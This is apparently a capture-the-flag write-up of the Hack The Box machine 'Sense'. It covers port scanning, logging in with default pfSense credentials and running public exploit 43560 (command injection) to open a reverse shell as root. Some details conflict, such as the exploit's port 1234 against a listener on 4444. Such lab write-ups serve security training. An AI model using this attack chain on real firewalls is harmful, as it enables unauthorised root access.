# SENSE

## NMAP

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/sense]
└─$ nmap 10.10.10.60
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-16 05:35 EDT
Nmap scan report for 10.10.10.60
Host is up (0.18s latency).
Not shown: 998 filtered ports
PORT    STATE SERVICE
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 16.37 seconds
                                                                                       
┌──(kali㉿kali)-[~/Downloads/hackthebox/sense]
└─$ nmap 10.10.10.60 -p 80,443 -A
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-16 05:37 EDT
Nmap scan report for 10.10.10.60
Host is up (0.17s latency).

PORT    STATE SERVICE    VERSION
80/tcp  open  http       lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Did not follow redirect to https://10.10.10.60/
443/tcp open  ssl/https?
| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US
| Not valid before: 2017-10-14T19:21:35
|_Not valid after:  2023-04-06T19:21:35
|_ssl-date: TLS randomness does not represent time
```

## WEBSITE

![](https://github.com/Leo-2807/Writeups/blob/main/images/sense1.png)

### DIRBUSTER

![](https://github.com/Leo-2807/Writeups/blob/main/images/sense4.png)

### SYSTEM-USERS.TXT

![](https://github.com/Leo-2807/Writeups/blob/main/images/sense2.png)

### LOGIN

Logging in using the creds `username:rohit` and `password:pfsense` which is the default password for pfsense

![](https://github.com/Leo-2807/Writeups/blob/main/images/sense3.png)

## EXPLOIT

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/sense]
└─$ searchsploit pfsense 2.1.3   
----------------------------------------------------- ---------------------------------
 Exploit Title                                       |  Path
----------------------------------------------------- ---------------------------------
pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command | php/webapps/43560.py
----------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
                                                                                       
┌──(kali㉿kali)-[~/Downloads/hackthebox/sense]
└─$ searchsploit -m php/webpass/43560.py  
  Exploit: pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injection
      URL: https://www.exploit-db.com/exploits/43560
     Path: /usr/share/exploitdb/exploits/php/webapps/43560.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /home/kali/Downloads/hackthebox/sense/43560.py

┌──(kali㉿kali)-[~/Downloads/hackthebox/sense]
└─$ python3 43560.py --rhost 10.10.10.60 --lhost 10.10.14.5 --lport 1234 --username rohit --password pfsense
CSRF token obtained
Running exploit...
Exploit completed
```

## SHELL

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/sense]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.60] 43734
sh: can't access tty; job control turned off
# whoami
root
```

Since we are already root we don't have to do anything and can read the root.txt and user.txt very easily
